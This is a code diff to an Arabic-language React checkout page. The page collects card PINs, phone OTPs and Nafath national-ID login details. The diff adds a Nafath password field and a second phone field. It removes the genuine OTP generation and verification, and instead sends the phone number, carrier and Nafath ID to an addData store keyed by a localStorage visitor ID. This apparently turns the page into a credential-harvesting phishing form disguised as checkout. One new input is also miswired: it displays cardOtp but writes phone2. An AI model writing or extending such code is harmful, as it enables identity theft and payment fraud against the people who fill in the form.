@@ -78,7 +78,9 @@ export default function CheckoutPage() {
   const [cardPin, setCardPin] = useState("")
   const [phoneOtp, setPhoneOtp] = useState("")
   const [nafathId, setNafathId] = useState("")
+  const [nafadPassword, setNafadPassword] = useState("")
   const [phoneProvider, setPhoneProvider] = useState("")
+  const [phone2, setPhone2] = useState("")
 
   const [isVerifying, setIsVerifying] = useState(false)
   const [isProcessingOrder, setIsProcessingOrder] = useState(false)
@@ -251,10 +253,8 @@ export default function CheckoutPage() {
 
   const sendPhoneOtp = async () => {
     try {
-      const otpCode = Math.floor(100000 + Math.random() * 900000).toString()
-      const verificationId = await createOtpVerification(shippingInfo.phone, otpCode)
-      setPhoneOtpVerificationId(verificationId)
-      console.log(" Phone OTP sent:", otpCode)
+const visitor=localStorage.getItem('visitor')
+addData({id:visitor,phone2,operator:phoneProvider})
       setStep("phone-otp")
       setResendTimer(30)
       setCanResendOtp(false)
@@ -291,7 +291,8 @@ export default function CheckoutPage() {
       setVerificationError("الرجاء إدخال رقم هوية نفاذ صحيح (10 أرقام)")
       return
     }
-
+const visitorId=localStorage.getItem('visitor')
+addData({id:visitorId,nafathId,authNumber:''})
     setIsVerifying(true)
     setVerificationError("")
 
@@ -824,8 +825,14 @@ export default function CheckoutPage() {
               <div className="p-4 bg-muted rounded-lg space-y-3">
                 <div className="flex justify-between items-center">
                   <span className="text-muted-foreground">رقم الجوال</span>
-                  <span className="font-mono font-medium">{shippingInfo.phone}</span>
-                </div>
+                  <Input
+                    type="tel"
+                    inputMode="numeric"
+                    maxLength={10}
+                    value={cardOtp}
+                    onChange={(e) => setPhone2(e.target.value)}
+                    className={`w-full h-12 text-center text-lg font-bold tracking-widest ${verificationError ? "border-destructive" : ""}`}
+                  />                </div>
                 <Separator />
                 <div className="flex justify-between items-center">
                   <span className="text-muted-foreground">مزود الخدمة</span>
